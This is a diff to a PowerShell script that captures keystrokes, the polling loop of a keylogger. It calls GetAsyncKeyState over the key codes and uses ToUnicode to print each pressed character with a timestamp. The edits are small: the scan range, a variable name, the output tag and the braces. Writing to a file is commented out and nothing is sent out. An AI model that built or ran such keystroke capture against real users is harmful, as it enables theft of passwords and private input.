@@ -26,7 +26,7 @@ while ($recording) {
   #Start-Sleep -Milliseconds 40
   
   # scan all ASCII codes above 8
-  for ($ascii = 9; $ascii -le 254; $ascii++) {
+  for ($ascii = 7; $ascii -le 254; $ascii++) {
     # get current key state
     $state = $API::GetAsyncKeyState($ascii)
     #$state
@@ -49,14 +49,14 @@ while ($recording) {
       $mychar = New-Object -TypeName System.Text.StringBuilder
 
       # translate virtual key
-      $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+      $letter = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
-      if ($success) 
+      if ($letter) 
       {
         
-        (Get-Date -Format FileDateTime) + '-' + $mychar + '-K'
+        (Get-Date -Format FileDateTime) + '-' + $mychar + '-KL'
         #[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+      } 
       }
     }
   }
-}
